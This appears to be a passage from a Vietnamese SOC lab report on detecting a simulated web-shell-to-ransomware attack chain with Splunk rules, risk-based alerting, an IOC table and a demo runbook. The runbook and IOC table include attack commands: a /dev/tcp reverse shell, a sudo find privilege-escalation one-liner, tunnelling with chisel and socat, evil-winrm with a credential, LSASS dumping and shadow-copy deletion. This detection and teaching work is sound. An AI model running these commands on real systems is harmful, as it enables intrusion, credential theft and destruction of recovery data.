    NETWORK["Network / Host Artifacts (Port Scans, URI patterns) \n [Rules: 01, 04, 06] \n Độ khó: Vừa phải (Annoying)"]
    HASH_IP["IP / Domain / File Hashes \n [IOCs cơ bản] \n Độ khó: Dễ dàng thay đổi (Trivial)"]

    HASH_IP --> NETWORK
    NETWORK --> TOOLS
    TOOLS --> TTP

```

### Bảng tổng hợp đối chiếu kỹ thuật và Bằng chứng thực tế trên Splunk

| Rule ID | Tên Luật Phát Hiện | MITRE Technique | Log Source | Tầng Pyramid | Risk Score | Số sự kiện ghi nhận trên Lab |
| :---: | :--- | :--- | :--- | :--- | :---: | :---: |
| **01** | Web Shell RCE Execution | `T1190`, `T1505.003` | `web_logs` | Host Artifacts | **20** | **52 events** |
| **02** | Cron Persistence | `T1053.003` | `linux_security` | TTPs / Behavior | **50** | **105 events** |
| **03** | Sudo GTFOBins Escalation | `T1548.003` | `linux_security` | TTPs / Behavior | **60** | **246 events** |
| **04** | Sensitive Config Read | `T1552.001` | `linux_security` | Host Artifacts | **35** | **24 events** |
| **05** | Ingress Tools và Tunneling | `T1105`, `T1090.001` | `linux_security` | Tools / TTPs | **55** | **652 events** |
| **06** | Internal Port Scanning | `T1046` | `windows_sysmon` | Network Artifacts | **20** | **2,805 connections** |
| **07** | Suspicious WinRM Access | `T1021.006` | `windows_security` | TTPs / Context | **75** | **2,808 events** |
| **08** | Rogue Admin Creation | `T1136.001`, `T1098`| `windows_security` | TTPs / Behavior | **80** | **18 events** |
| **09** | Defender Tampering | `T1562.001` | `windows_logs` | TTPs / Evasion | **85** | **65 events** |
| **10** | LSASS Memory Dumping | `T1003.001` | `windows_sysmon` | TTPs / LOLBins | **90** | **10 events** |
| **11** | VSS Deletion | `T1490` | `windows_sysmon` | TTPs / Critical | **95** | **8 events** |
| **12** | Mass File Encryption | `T1486` | `windows_sysmon` | TTPs / Impact | **100** | **180+ encrypted files** |

---

## 8. Cảnh Báo Dựa Trên Rủi Ro (Risk-Based Alerting - RBA)

!!! warning "Triết lý RBA trong Splunk Enterprise Security (ES 8)"

    Thay vì bắn alert đơn lẻ cho từng sự kiện khiến SOC quá tải (*Alert Fatigue*), cơ chế RBA gán **Risk Score** cho đối tượng rủi ro (*Risk Object*: host hoặc user). Một cảnh báo tổng hợp (*Notable Incident*) chỉ được tạo ra khi **tổng điểm rủi ro vượt ngưỡng (ngưỡng 100)** và xuất hiện chuỗi hành vi đa giai đoạn.


```mermaid
graph LR
    R1["Rule 01 (Risk: 20)"] --> AGG["Risk Aggregation Engine \n Entity: Web-Server / Win-Server \n Timeframe: 1 Hour"]
    R2["Rule 03 (Risk: 60)"] --> AGG
    R5["Rule 05 (Risk: 55)"] --> AGG
    R8["Rule 08 (Risk: 80)"] --> AGG
    R10["Rule 10 (Risk: 90)"] --> AGG
    R12["Rule 12 (Risk: 100)"] --> AGG
    
    AGG -->|"Total Risk >= 100"| NOTABLE[" NOTABLE EVENT: \n Multi-Stage Targeted Attack và Ransomware \n (Consolidated Attack Story)"]

```

### Correlation Search Tổng Hợp Chuỗi Tấn Công (RBA Master Search)

```bash
| union
    [ search index=web_logs method IN ("GET","POST") file IN ("*.php","*.phtml","*.asp","*.aspx","*.jsp")
      | eval stage="1-InitialAccess_Webshell", risk_score=20, entity=coalesce(host, clientip)
      | fields _time entity stage risk_score ]
    [ search index=linux_security sourcetype=auditd (comm="crontab" OR key="cron_file_write")
      | eval stage="2-Persistence_Cron", risk_score=50, entity=host
      | fields _time entity stage risk_score ]
    [ search index=linux_security sourcetype=linux_secure "sudo:" "COMMAND="
      | eval stage="3-PrivEsc_Sudo", risk_score=60, entity=host
      | fields _time entity stage risk_score ]
    [ search index=linux_security sourcetype=auditd (key=sensitive_config_read OR comm IN ("chisel","socat"))
      | eval stage="4-Tunneling_Pivoting", risk_score=55, entity=host
      | fields _time entity stage risk_score ]
    [ search index=windows_security EventCode=4624 Logon_Type=3
      | rex field=_raw "Account Name:\s*(?<user>[^\r\n]+)"
      | eval stage="5-LateralMovement_WinRM", risk_score=75, entity=coalesce(host, ComputerName, user)
      | fields _time entity stage risk_score ]
    [ search index=windows_security (EventCode=4720 OR EventCode=4732)
      | eval stage="6-Persistence_WinAdmin", risk_score=80, entity=coalesce(host, ComputerName)
      | fields _time entity stage risk_score ]
    [ search index=windows_sysmon EventCode=10 TargetImage="*lsass.exe"
      | eval stage="7-CredentialDumping_LSASS", risk_score=90, entity=coalesce(host, Computer)
      | fields _time entity stage risk_score ]
    [ search index=windows_sysmon EventCode=1 (Image="*vssadmin.exe" OR Image="*bcdedit.exe")
      | eval stage="8-InhibitRecovery_VSS", risk_score=95, entity=coalesce(host, Computer)
      | fields _time entity stage risk_score ]
    [ search index=windows_sysmon EventCode=11 TargetFilename="*.locked"
      | bin _time span=1m
      | stats dc(TargetFilename) as files by host, _time
      | where files >= 3
      | eval stage="9-Impact_Ransomware", risk_score=100, entity=host
      | fields _time entity stage risk_score ]
| stats sum(risk_score) as total_risk,
        dc(stage) as stages_triggered,
        values(stage) as attack_stages,
        min(_time) as attack_start,
        max(_time) as attack_end
| where total_risk >= 100
| eval attack_duration_min = round((attack_end - attack_start)/60, 2)
| eval incident_severity = case(
    total_risk >= 250, "CRITICAL: Full Kill Chain Completed",
    total_risk >= 150, "HIGH: Multi-Stage Attack in Progress",
    total_risk >= 100, "MEDIUM: Suspicious Correlated Activity",
    1=1, "LOW"
  )
| convert ctime(attack_start) ctime(attack_end)
| table attack_start attack_end total_risk stages_triggered incident_severity attack_duration_min attack_stages
```

---

## 9. Các File Lookup Bổ Trợ (Lookup Tables Reference)

### 9.1 File `gtfobins_lookup.csv`
Đặt tại `/opt/splunk/etc/apps/search/lookups/gtfobins_lookup.csv`:

```csv
binary,is_gtfobin,risk_weight
find,true,high
vim,true,high
vi,true,high
nano,true,medium
less,true,medium
more,true,medium
awk,true,high
nmap,true,high
python,true,critical
perl,true,critical
ruby,true,critical
php,true,critical
tar,true,medium
zip,true,medium
cp,true,high
mv,true,high
env,true,high
socat,true,critical
bash,true,critical
sh,true,critical
```

### 9.2 File `admin_workstations_lookup.csv`
Đặt tại `/opt/splunk/etc/apps/search/lookups/admin_workstations_lookup.csv`:

```csv
ip,hostname,is_admin_ws,authorized_department
192.168.100.5,admin-sec-ws01,true,SOC_Team
192.168.100.6,admin-it-ws02,true,IT_Operations
192.168.100.7,jumphost-prod,true,DataCenter_Ops
```

---

## 10. Danh Mục Chỉ Số Tấn Công Tổng Hợp (Master IOC Matrix)

| Loại IOC | Giá trị định danh / Mẫu nhận diện | Vị trí phát hiện | Giai đoạn tấn công |
| :--- | :--- | :--- | :--- |
| **Network IP** | `192.168.50.100` (Attacker C2 / Staging) | Tường lửa biên / Web Access Log | Initial Access, Tunneling |
| **Network Port** | `4444` (Reverse Shell), `8080` (Chisel Server), `5555` (Socat Pivot) | Linux Auditd, Netstat | C2, Pivoting |
| **File Path** | `/var/www/html/dvwa/hackable/uploads/shell.php` | Web Server Document Root | Initial Access |
| **File Path** | `/tmp/chisel` | Web Server File System | Tool Transfer |
| **File Path** | `/etc/sudoers.d/lab-misconfig` | Linux Security Config | Privilege Escalation |
| **File Path** | `C:\Windows\Temp\procdump64.exe`, `C:\Windows\Temp\lsass.dmp` | Windows Server Temp | Credential Dumping |
| **Account** | `svc_backup` (Lộ lọt credential trong mã nguồn) | Web Config, Windows Security | Credential Access |
| **Account** | `backdoor` (Local Administrator mới tạo) | Windows SAM / Event 4720 | Persistence |
| **Process Lineage** | `apache2` $\rightarrow$ `sh` $\rightarrow$ `bash -i >& /dev/tcp/...` | Auditd Execve Events | Execution |
| **Process Service** | `sc.exe create DumpService binPath= "..."` | Windows System Service | Credential Access |
| **Command Line** | `vssadmin delete shadows /all /quiet` | Windows Sysmon Event 1 | Inhibit Recovery |
| **File Extension** | `*.locked`, `*.encrypted` (XOR Byte Header) | `C:\Users\Public\LabData\` | Ransomware Impact |

---

## 11. Khuyến Nghị Phòng Thủ và Khắc Phục (Mitigation và Hardening)

```mermaid
graph LR
    subgraph L1 ["Lớp 1: Ứng dụng và Vùng biên (Perimeter và Web)"]
        W1["WAF và Input Validation (Chặn upload file thực thi)"]
        W2["Least Privilege cho Web User (www-data nologin)"]
    end

    subgraph L2 ["Lớp 2: Hệ thống Linux (Linux Hardening)"]
        L_1["Rà soát Sudoers (Xóa NOPASSWD trên binary GTFOBins)"]
        L_2["FIM (File Integrity Monitoring) trên /etc/cron* và /etc/sudoers"]
        L_3["Bảo vệ Secret (Chuyển secret sang HashiCorp Vault / KMS)"]
    end

    subgraph L3 ["Lớp 3: Phân vùng mạng (Network Segmentation)"]
        N1["Egress Filtering nghiêm ngặt (Chặn kết nối outbound lạ từ DMZ)"]
        N2["Micro-Segmentation giữa DMZ và mạng Internal (Chặn WinRM/SMB trực tiếp)"]
    end

    subgraph L4 ["Lớp 4: Máy chủ Windows và Active Directory"]
        Win1["Bật LSA Protection (RunAsPPL) và Credential Guard"]
        Win2["Triển khai LAPS (Local Administrator Password Solution)"]
        Win33["Giới hạn quyền quản trị từ xa qua WinRM (Restricted Remote Admin)"]
    end

    subgraph L5 ["Lớp 5: Dữ liệu và Ứng phó sự cố"]
        D1["Sao lưu dữ liệu ngoại tuyến bất biến (Immutable Offline Backup)"]
        D2["Triển khai EDR và Giám sát RBA tập trung trên Splunk SIEM"]
    end

    L1 --> L2
    L2 --> L3
    L3 --> L4
    L4 --> L5
```

---

## 12. Kịch Bản Diễn Tập và Trình Diễn SOC (Demo Runbook)

```
[00:00 - 05:00] BƯỚC 01: Kiểm tra kết nối và luồng log
                 ▶ Splunk: `index=* | stats count by index` (Đảm bảo 6 index đều có dữ liệu).

[05:00 - 10:00] BƯỚC 02: Trinh sát mạng từ Kali
                 ▶ Kali: `nmap -sV 192.168.50.20` và `nikto -h http://192.168.50.20/dvwa/`
                 ▶ Splunk: Kiểm tra `index=web_logs` nhận diện traffic quét.

[10:00 - 15:00] BƯỚC 03: Khai thác Web Shell và Reverse TCP
                 ▶ Kali: Upload `shell.php` và gửi payload Reverse Shell port 4444.
                 ▶ Splunk: Alert kích hoạt trên Rule 01 (Web Shell Access).

[15:00 - 20:00] BƯỚC 04: Cài đặt Cron Persistence
                 ▶ Web Shell: `crontab -e` thêm reverse shell.
                 ▶ Splunk: Alert kích hoạt trên Rule 02 (Cron Persistence).

[20:00 - 25:00] BƯỚC 05: Leo quyền Root qua Sudo Find
                 ▶ Web Shell: `sudo /usr/bin/find . -exec /bin/sh \; -quit`
                 ▶ Splunk: Alert kích hoạt trên Rule 03 (Sudo GTFOBins).

[25:00 - 30:00] BƯỚC 06: Đọc trộm file cấu hình
                 ▶ Root Shell: `cat /var/www/html/dvwa/config/config.inc.php`
                 ▶ Splunk: Alert kích hoạt trên Rule 04 (Sensitive Config Read).

[30:00 - 40:00] BƯỚC 07: Tải Chisel và Thiết lập Reverse SOCKS Tunnel
                 ▶ Kali: `./chisel server` | Web: `/tmp/chisel client`
                 ▶ Splunk: Alert kích hoạt trên Rule 05 (Tunneling và Ingress Tools).

[40:00 - 45:00] BƯỚC 08: Quét cổng nội bộ và Mở Socat Port Forward
                 ▶ Web: `socat TCP-LISTEN:5555...` | Kali: `proxychains nmap`
                 ▶ Splunk: Alert kích hoạt trên Rule 06 (Internal Reconnaissance).

[45:00 - 55:00] BƯỚC 09: Di chuyển ngang qua Evil-WinRM
                 ▶ Kali: `evil-winrm -i 192.168.50.20 -u svc_backup -p P@ssw0rd2026! -P 5555`
                 ▶ Splunk: Alert kích hoạt trên Rule 07 (WinRM Network Logon).

[55:00 - 60:00] BƯỚC 10: Tạo tài khoản quản trị ngầm 'backdoor'
                 ▶ Windows Shell: `net user backdoor ... /add` và `net localgroup administrators ...`
                 ▶ Splunk: Alert kích hoạt trên Rule 08 (Admin Account Creation).

[60:00 - 68:00] BƯỚC 11: Tắt Defender và Dump LSASS qua ProcDump Service
                 ▶ Windows Shell: `Set-MpPreference` và tạo `DumpService`
                 ▶ Splunk: Alert kích hoạt trên Rule 09 (Defender Tamper) và Rule 10 (LSASS Dump).

[68:00 - 75:00] BƯỚC 12: Xóa Volume Shadow Copies (VSS)
                 ▶ Windows Shell: `vssadmin delete shadows /all /quiet`
                 ▶ Splunk: Alert kích hoạt trên Rule 11 (VSS Deletion).

[75:00 - 80:00] BƯỚC 13: Thực thi mã hóa tống tiền hàng loạt
                 ▶ Windows Shell: Chạy script XOR Byte Encryption trên `C:\Users\Public\LabData`
                 ▶ Splunk: Alert kích hoạt trên Rule 12 (Mass File Encryption).

[80:00 - 90:00] BƯỚC 14: Tổng kết và Đánh giá trên RBA Master Dashboard
                 ▶ Splunk: Chạy Master Correlation Search (Mục 8) để hiển thị biểu đồ Risk Score
                 ▶ Kết quả: Tạo 1 Notable Event duy nhất kể lại toàn bộ câu chuyện tấn công đa tầng!
```

---

## 13. Bảng Hỏi - Đáp Chuyên Sâu Khi Bảo Vệ / Trình Bày (Presentation Defense và Q&A)

??? question "Q1: Tại sao Web Access Log chỉ bắt được request GET mà không bắt được nội dung POST body? Khắc phục thế nào?"

    - **Nguyên nhân**: Mặc định các web server (Apache/Nginx) chỉ ghi nhận HTTP Headers, URL Path và Query String trong `access.log` để tối ưu hóa I/O disk và tránh ghi nhận dữ liệu nhạy cảm của người dùng (như mật khẩu trong POST form).
    - **Giải pháp khắc phục**:
    1. Sử dụng module WAF như **ModSecurity** trên Apache để log chi tiết request body vào `audit.log`.
    2. Giám sát hành vi tiến trình con ở tầng OS (Auditd Execve / Sysmon for Linux) khi webshell sinh ra tiến trình thực thi lệnh hệ điều hành.


??? question "Q2: Giá trị `auid=4294967295` trong Auditd mang ý nghĩa gì trong điều tra số?"

    - **Ý nghĩa kỹ thuật**: `auid` (Audit User ID) bằng `4294967295` tương ứng với giá trị nhị phân `0xFFFFFFFF` (`-1` không dấu), đại diện cho trạng thái **"unset" (chưa đăng nhập)**.
    - **Ý nghĩa phát hiện**: Bất kỳ tiến trình nào chạy bởi service daemon (như Apache/PHP-FPM) hoặc sinh ra từ một cuộc tấn công từ xa (như Web Shell / RCE) đều mang `auid` unset vì chúng không trải qua quá trình xác thực đăng nhập qua PAM/SSH/Console. Do đó, nếu một tiến trình có `auid=4294967295` mà thực hiện đọc file cấu hình quản trị thì đây là chỉ số bất thường cực kỳ đáng tin cậy.


??? question "Q3: Tại sao cần áp dụng Risk-Based Alerting (RBA) thay vì alert độc lập từng rule?"

    - **Vấn đề thực tế**: Nếu bắn alert đơn lẻ cho 12 rules, một cuộc tấn công sẽ tạo ra hàng chục thông báo rời rạc, làm phân mảnh bối cảnh điều tra và dẫn đến **Alert Fatigue** (quá tải cảnh báo).
    - **Lợi ích của RBA**:
    1. Gán điểm rủi ro (*Risk Score*) cho từng thực thể (Entity: Host/User).
    2. Tự động tương quan nhiều giai đoạn tấn công khác nhau theo thời gian.
    3. Gom toàn bộ chuỗi tấn công thành **1 Notable Event duy nhất**, giúp SOC Analyst nắm bắt trọn vẹn câu chuyện tấn công (*Attack Story*) từ bước xâm nhập ban đầu đến đích cuối cùng.


??? question "Q4: Tại sao `GrantedAccess=0x1010` lại thường bị bỏ sót trong phát hiện LSASS Dumping?"

    - **Giải thích**: Nhiều SOC Analyst chỉ cấu hình bắt quyền tối đa `0x1fffff` (PROCESS_ALL_ACCESS) hoặc `0x1410`. Tuy nhiên, các kỹ thuật dump hiện đại (và một số biến thể Mimikatz/Dumpert) chỉ yêu cầu quyền tối thiểu `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`) kết hợp với `PROCESS_VM_READ` (`0x0010`) $\rightarrow$ Tạo thành mask `0x1010`. Nếu luật phát hiện không bao gồm `0x1010`, kẻ tấn công có thể dễ dàng bypass hệ thống SIEM.


---

## 14. Tài Liệu Tham Khảo (References)

- **MITRE ATT&CK Framework Enterprise**: [https://attack.mitre.org/](https://attack.mitre.org/)
- **GTFOBins Curated Unix Binaries**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- **LOLBAS Windows Living Off The Land**: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
- **Splunk Enterprise Security RBA Guide**: [https://docs.splunk.com/Documentation/ES/latest/User/RiskBasedAlerting](https://docs.splunk.com/Documentation/ES/latest/User/RiskBasedAlerting)
- **SwiftOnSecurity Sysmon Configuration**: [https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)
- **Obsidian Agent Skills Specification**: [https://github.com/kepano/obsidian-skills](https://github.com/kepano/obsidian-skills)
